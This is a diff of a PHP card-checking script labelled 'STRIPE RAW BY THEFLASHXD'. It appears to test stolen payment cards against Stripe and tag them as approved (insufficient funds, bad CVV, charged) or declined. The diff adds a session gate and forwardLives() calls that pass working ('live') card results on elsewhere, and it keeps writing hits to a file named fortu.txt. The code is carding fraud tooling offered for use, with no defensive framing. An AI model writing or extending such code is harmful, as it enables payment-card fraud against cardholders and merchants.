@@ -1,10 +1,12 @@
 <?php
-
+require_once("functions.php");
 session_start();
 if(!isset($_SESSION["user_id"])){
     header("Location: login.php");
     exit;
 }
+$userId = $_SESSION["user_id"];
+
 
 ##################### STRIPE RAW BY THEFLASHXD ###########################
 error_reporting(0);
@@ -146,14 +148,17 @@ $msg = trim(strip_tags(getStr($curl,'message":"','"')));
 //echo "<br> Results => $msg <br>";
 
 if(strpos($curl, 'Your card has insufficient funds.')){
-echo '<#Approved '.$ip.'「Insufficient Funds」 「Stripe Charge : @luffy_dxD」';
+echo '#Approved '.$ip.'「Insufficient Funds」 「Stripe Charge : @luffy_dxD」';
+    forwardLives("Stripe",$msg);
 }
 elseif(strpos($curl, 'security code is incorrect.')){
 echo '#Approved '.$ip.'「'.$error.'」 「Stripe Charge : @luffy_dxD」';
+    forwardLives("Stripe",$msg);
 }
 elseif(strpos($curl, 'status":true')){
 echo '#Approved '.$ip.'「CHARGED CVV」 「Stripe Charge : @luffy_dxD';
 fwrite(fopen("fortu.txt", 'a'), $ip. "\r\n");
+    forwardLives("Stripe","CHARGED CVV");
 }
 else{
 echo '#Declined '.$ip.'「Declined : '.$msg.' : @luffy_dxD」';
